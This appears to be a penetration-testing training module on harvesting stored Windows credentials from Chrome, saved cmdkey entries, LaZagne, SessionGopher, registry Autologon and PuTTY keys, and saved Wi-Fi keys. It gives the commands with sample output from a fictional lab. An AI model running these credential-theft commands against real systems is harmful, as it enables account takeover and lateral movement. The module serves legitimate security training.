# Further credential theft

# **Cmdkey Saved Credentials**

```markdown
**we can view saved credentials using:
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
	

then, we can use these saved credentails to login into the user:
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"**
```

# **Browser Credentials**

```markdown
**We can use sharpchrome to enumerate credentials from chrome:
S C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1**
```

## Email

If we gain access to a domain-joined system in the context of a 
domain user with a Microsoft Exchange inbox, we can attempt to search 
the user's email for terms such as "pass," "creds," "credentials," etc. 
using the tool [MailSniper](https://github.com/dafthack/MailSniper).

---

## More Fun with Credentials

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne)
 tool in an attempt to retrieve credentials from a wide variety of 
software. Such software includes web browsers, chat clients, databases, 
email, memory dumps, various sysadmin tools, and internal password 
storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.).
 The tool can be used to run all modules, specific modules (such as 
databases), or against a particular piece of software (i.e., OpenVPN). 
The output can be saved to a standard text file or in JSON format. Let's
 take it for a spin.

### Viewing LaZagne Help Menu

We can view the help menu with the `-h` flag.

Further Credential Theft

```powershell
PS C:\htb> .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version

```

### Running All LaZagne Modules

As we can see, there are many modules available to us. Running the tool with `all`
 will search for supported applications and return any discovered 
cleartext credentials. As we can see from the example below, many 
applications do not store credentials securely (best never to store 
credentials, period!). They can easily be retrieved and used to escalate
 privileges locally, move on to another system, or access sensitive 
data.

Further Credential Theft

```powershell
PS C:\htb> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602

```

---

## Even More Fun with Credentials

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
 to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP 
credentials. The tool is written in PowerShell and searches for and 
decrypts saved login information for remote access tools. It can be run 
locally or remotely. It searches the `HKEY_USERS` hive for 
all users who have logged into a domain-joined (or standalone) host and 
searches for and decrypts any saved session information it can find. It 
can also be run to search drives for PuTTY private key files (.ppk), 
Remote Desktop (.rdp), and RSA (.sdtid) files.

### Running SessionGopher as Current User

We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

Further Credential Theft

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1

PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions

Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

PuTTY Sessions

Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local

SuperPuTTY Sessions

Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings

```

---

## Clear-Text Password Storage in the Registry

Certain programs and windows configurations can result in clear-text 
passwords or other data being stored in the registry. While tools such 
as `Lazagne` and `SessionGopher` are a great way 
to extract credentials, as penetration testers we should also be 
familiar and comfortable with enumerating them manually.

### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon)
 is a feature that allows a user to configure their Windows operating 
system to automatically log on to a specific user account, without 
requiring manual input of the username and password at each startup. 
However, once this is configured, the username and password are stored 
in the registry, in clear-text. This feature is commonly used on 
single-user systems or in situations where convenience outweighs the 
need for enhanced security.

The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

Code: cmd

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

```

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.

### Enumerating Autologon with reg.exe

Further Credential Theft

```
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0

    <SNIP>

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!

```

**`Note:`** If you absolutely must 
configure Autologon for your windows system, it is recommended to use 
Autologon.exe from the Sysinternals suite, which will encrypt the 
password as an LSA secret.

### Putty

For Putty sessions utilizing a proxy connection, when the session is 
saved, the credentials are stored in the registry in clear text.

Code: cmd

```
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

```

Note that the access controls for this specific registry key are tied
 to the user account that configured and saved the session. Therefore, 
in order to see it, we would need to be logged in as that user and 
search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

### Enumerating Sessions and Finding Credentials:

First, we need to enumerate the available saved sessions:

Further Credential Theft

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

```

Next, we look at the keys and values of the discovered session "`kali%20ssh`":

Further Credential Theft

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log

  <SNIP>

    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!

```

In this example, we can imagine the scenario that the IT 
administrator has configured Putty for a user in their environment, but 
unfortunately used their admin credentials in the proxy connection. The 
password could be extracted and potentially reused across the network.

For additional information on `reg.exe` and working with the registry, be sure to check out the [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623) module.

---

## Wifi Passwords

### Viewing Saved Wireless Networks

If we obtain local admin access to a user's workstation with a 
wireless card, we can list out any wireless networks they have recently 
connected to.

Further Credential Theft

```
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp

```

### Retrieving Saved Wireless Passwords

Depending on the network configuration, we can retrieve the pre-shared key (`Key Content`
 below) and potentially access the target network. While rare, we may 
encounter this during an engagement and use this access to jump onto a 
separate wireless network and gain access to additional resources.

Further Credential Theft

```
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default

```